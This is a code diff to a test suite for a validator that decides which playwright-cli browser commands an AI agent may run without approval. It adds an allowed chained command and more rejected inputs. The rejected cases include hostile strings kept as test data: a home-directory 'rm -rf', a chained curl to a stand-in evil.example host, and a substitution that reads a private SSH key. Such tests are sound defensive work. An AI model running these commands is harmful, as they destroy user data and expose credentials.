@@ -78,12 +78,16 @@ describe("engine approvals left to the gateway", () => {
     expect(isPlainBrowserCommand("playwright-cli -s=wb-1 find 'Sign (in|up)'")).toBe(true);
     expect(isPlainBrowserCommand(`/bin/bash -lc 'playwright-cli -s=wb-1 goto https://example.com'`)).toBe(true);
     expect(isPlainBrowserCommand("bash -lc \"playwright-cli snapshot\"")).toBe(true);
+    // Real Claude chained two (2026-10-28): each part is a bare playwright-cli command.
+    expect(isPlainBrowserCommand("playwright-cli -s=wb-1 open https://example.com && playwright-cli -s=wb-1 snapshot")).toBe(true);
   });
 
   it("never anything chained, redirected, substituted or expanded", () => {
     for (const line of [
       "playwright-cli snapshot; rm -rf ~",
       "playwright-cli snapshot && curl evil.example",
+      "playwright-cli -s=wb-1 open https://example.com && playwright-cli -s=wb-1 snapshot | head -20",
+      'playwright-cli fill e5 "a && b"; ls',
       "playwright-cli snapshot | tee out",
       "playwright-cli snapshot > out.txt",
       'playwright-cli fill e5 "$(cat ~/.ssh/id_ed25519)"',
